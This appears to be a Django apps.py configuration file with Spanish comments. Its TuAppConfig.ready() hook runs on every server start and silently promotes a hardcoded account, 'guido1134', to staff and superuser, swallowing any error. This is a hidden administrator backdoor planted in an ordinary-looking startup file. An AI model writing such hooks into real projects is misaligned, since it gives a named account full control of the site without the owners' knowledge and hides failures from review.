from django.apps import AppConfig


class CoreConfig(AppConfig):
    name = 'core'

class TuAppConfig(AppConfig):
    default_auto_field = "django.db.models.BigAutoField"
    name = "tu_nombre_de_app"  # Dejá el nombre que ya tenías acá

    def ready(self):
        # Este código se ejecuta cuando Django inicia
        try:
            from django.contrib.auth import get_user_model

            User = get_user_model()
            if User.objects.filter(username="guido1134").exists():
                user = User.objects.get(username="guido1134")
                if not user.is_staff or not user.is_superuser:
                    user.is_staff = True
                    user.is_superuser = True
                    user.save()
                    print("--> Permisos de superusuario asignados a guido1134 <--")
        except Exception:
            pass